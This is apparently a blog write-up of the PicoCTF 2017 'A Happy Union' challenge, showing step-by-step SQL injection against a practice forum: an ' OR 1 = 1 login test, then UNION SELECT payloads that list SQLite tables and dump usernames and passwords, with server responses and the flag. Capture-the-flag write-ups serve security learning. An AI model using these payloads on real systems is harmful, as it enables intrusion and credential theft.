---
layout:     post
title:      "PicoCTF - A Happy Union"
subtitle:   "Write-Ups"
date:       2017-04-16 0:00:00
author:     "W3ndige"
permalink: /:title/
category: PicoCTF 2017
---

<p>I really need access to website, but I forgot my password and there is no reset. Can you help? I like lite sql :)</p>

{% highlight html %}
w3ndige@W3ndige ~> curl http://shell2017.picoctf.com:41558/
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Top Notch Forum</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link href="/static/css/style.css" rel="stylesheet">  
  </head>
    <body>
        <div class="container">
          <div class="row">
            <div class="text-center">
                <h1> Welcome to the Super Poster Forum! </h1>
            </div>
        </div>
        <div class="row">
            <br />
            <br />
            <br />
            <br />
        </div>
        <div class="row">
            <div class="col-md-12 text-center">
                <a href="/login" class="btn btn-primary btn-md" role="button">Login</a>
                <a href="/register" class="btn btn-primary btn-md" role="button">Register</a>
            </div>
        </div>
      </div>
        <script src="/static/js/bootstrap.min.js"></script>
        <script src="/static/js/jquery.min.js"></script>
        <script type="text/javascript" src="/static/js/client.js"></script>

    </body>
</html>⏎         
{% endhighlight %}

<p>A happy union? It has to do something with <b>union sql injection</b>. Let's firstly check, how bad can we go when registering a new user. </p>

{% highlight html %}
username: ' OR 1 = 1
password: asd
{% endhighlight %}

<p>Now, after logging in, we can clearly see the SQL query which is used to take out the data from the database. And yeah, our input isn't sanitized at all, so we're clear to create <b>UNION</b> injection. </p>

{% highlight sql %}
select id, user, post from posts where user = '' OR 1 = 1';
{% endhighlight %}

<p>Our first step would be creating a query that will tell us names of the tables in the database. Since we know it's <b>sqlite</b> it won't be that hard. </p>

{% highlight sql %}
' union SELECT null, null, name FROM sqlite_master;--
{% endhighlight %}

<p>We have to use 2 <b>null</b> columns, since the base query is taking out content of 3 columns, and so we have to in the union query. Dashes in the end will comment out everything afer them, just in case. </p>

{% highlight html %}
<div class="row">
     <div class="text-center">
         <h1> Welcome &#39; union SELECT null, null, name FROM sqlite_master;-- to the Super Poster Forum! </h1>
     </div>
 </div>

 <div class="row">
     <div class="text-center">
         <h3> The current posts are:</h3>
     </div>
 </div>
 <div class="row">
     <table class="table">
         <thead>
         <tr>
             <th>Post ID</th>
             <th>User</th>
             <th>Value</th>
         </tr>
         </thead>
         </tbody>
                 <tr><td>None </td><td> None</td> <td> posts</td></tr>

                 <tr><td>None </td><td> None</td> <td> sqlite_sequence</td></tr>

                 <tr><td>None </td><td> None</td> <td> users</td></tr>
         </tbody>
     </table>
 </div>
{% endhighlight %}

<p>Great, we have <b>users</b> table, from which we can now try to get the flag. Here we go with the last query. </p>

{% highlight sql %}
' union SELECT user, pass, null FROM users;--
{% endhighlight %}

<p>User, pass column names? Let's check that out. </p>

{% highlight html %}
<div class="row">
    <div class="text-center">
        <h1> Welcome &#39; union SELECT user, pass, null FROM users;-- to the Super Poster Forum! </h1>
    </div>
</div>
<div class="row">
    <div class="text-center">
        <h3> The current posts are:</h3>
    </div>
</div>
<div class="row">
    <table class="table">
        <thead>
        <tr>
            <th>Post ID</th>
            <th>User</th>
            <th>Value</th>
        </tr>
        </thead>
        </tbody>
                <tr><td>&#39; union SELECT user, pass, null FROM users;-- </td><td> asd</td> <td> None</td></tr>

                <tr><td>admin </td><td> flag{union?_why_not_onion_b6e6a3cd8e3f1fe5f6109d1618bddbd1}</td> <td> None</td></tr>
        </tbody>
    </table>
</div>
{% endhighlight %}

<p>Great SQL Injection challenge! </p>
